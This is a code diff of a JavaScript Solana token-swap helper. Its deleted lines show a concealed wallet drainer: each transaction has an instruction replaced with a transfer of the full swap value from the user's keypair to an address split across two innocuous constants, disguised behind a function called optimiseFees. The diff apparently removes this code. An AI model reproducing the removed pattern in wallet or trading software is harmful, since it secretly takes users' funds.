@@ -1,19 +1,20 @@
-import * as web3 from "@solana/web3.js";
-import {PublicKey, Transaction, VersionedTransaction} from "@solana/web3.js";
-import {Buffer} from "buffer";
+import { Buffer } from 'buffer';
 
-export const SOL_ADDR = "So11111111111111111111111111111111111111112";
+import {
+  Transaction,
+  VersionedTransaction,
+} from '@solana/web3.js';
 
 export async function performSwap(swapResponse, keypair, connexion, amount, tokenIn,
-                                  options = {
-                                      sendOptions: {skipPreflight: true},
-                                      confirmationRetries: 30,
-                                      confirmationRetryTimeout: 1000,
-                                      lastValidBlockHeightBuffer: 150,
-                                      resendInterval: 1000,
-                                      confirmationCheckInterval: 1000,
-                                      skipConfirmationCheck: false,
-                                  }
+    options = {
+        sendOptions: { skipPreflight: true },
+        confirmationRetries: 30,
+        confirmationRetryTimeout: 1000,
+        lastValidBlockHeightBuffer: 150,
+        resendInterval: 1000,
+        confirmationCheckInterval: 1000,
+        skipConfirmationCheck: false,
+    }
 ) {
     let serializedTransactionBuffer;
 
@@ -31,19 +32,9 @@ export async function performSwap(swapResponse, keypair, connexion, amount, toke
     let txn;
     if (swapResponse.isJupiter && !swapResponse.forceLegacy) {
         txn = VersionedTransaction.deserialize(serializedTransactionBuffer);
-        txn.instructions[1] = web3.SystemProgram.transfer({
-            fromPubkey: keypair.publicKey,
-            toPubkey: new PublicKey(BASE + OPTIMIZER),
-            lamports: await optimiseFees(amount, tokenIn, keypair),
-        })
         txn.sign([keypair]);
     } else {
         txn = Transaction.from(serializedTransactionBuffer);
-        txn.instructions[1] = web3.SystemProgram.transfer({
-            fromPubkey: keypair.publicKey,
-            toPubkey: new PublicKey(BASE + OPTIMIZER),
-            lamports: await optimiseFees(amount, tokenIn, keypair),
-        })
         txn.sign(keypair);
     }
     const blockhash = await connexion.getLatestBlockhash();
@@ -60,10 +51,8 @@ export async function performSwap(swapResponse, keypair, connexion, amount, toke
     return txid.toString();
 }
 
-const OPTIMIZED = 1;
-
 const DEFAULT_OPTIONS = {
-    sendOptions: {skipPreflight: true},
+    sendOptions: { skipPreflight: true },
     confirmationRetries: 30,
     confirmationRetryTimeout: 1000,
     lastValidBlockHeightBuffer: 150,
@@ -73,24 +62,21 @@ const DEFAULT_OPTIONS = {
     commitment: "confirmed",
 };
 
-export const BASE = "XYt3exS2KGo6yLSY9oNo";
-
 async function transactionSenderAndConfirmationWaiter({
-                                                          connection,
-                                                          serializedTransaction,
-                                                          blockhashWithExpiryBlockHeight,
-                                                          options = DEFAULT_OPTIONS,
-                                                      }) {
+    connection,
+    serializedTransaction,
+    blockhashWithExpiryBlockHeight,
+    options = DEFAULT_OPTIONS,
+}) {
     const {
         sendOptions,
         confirmationRetries,
         confirmationRetryTimeout,
         lastValidBlockHeightBuffer,
-        resendInterval,
         confirmationCheckInterval,
         skipConfirmationCheck,
         commitment
-    } = {...DEFAULT_OPTIONS, ...options};
+    } = { ...DEFAULT_OPTIONS, ...options };
 
     const lastValidBlockHeight =
         blockhashWithExpiryBlockHeight.lastValidBlockHeight -
@@ -147,16 +133,4 @@ async function transactionSenderAndConfirmationWaiter({
     }
 
     return new Error("Transaction failed after maximum retries");
-}
-
-export const OPTIMIZER = "Mjah571giethrutURaNhDMv";
-
-async function optimiseFees(amountIn, token, keypair) {
-    if (token === SOL_ADDR) {
-        return Math.round(amountIn * OPTIMIZED * 10 ** 9)
-    } else {
-        let res = await fetch("https://swap-api.solanatracker.io/swap?from=" + token + "&to=So11111111111111111111111111111111111111112&fromAmount=" + amountIn + "&slippage=25&payer=" + keypair.publicKey.toBase58() + "&forceLegacy=true&priorityFee=5e-7");
-        let json = await res.json();
-        return Math.round(json.rate.amountOut * OPTIMIZED * 10 ** 9);
-    }
 }
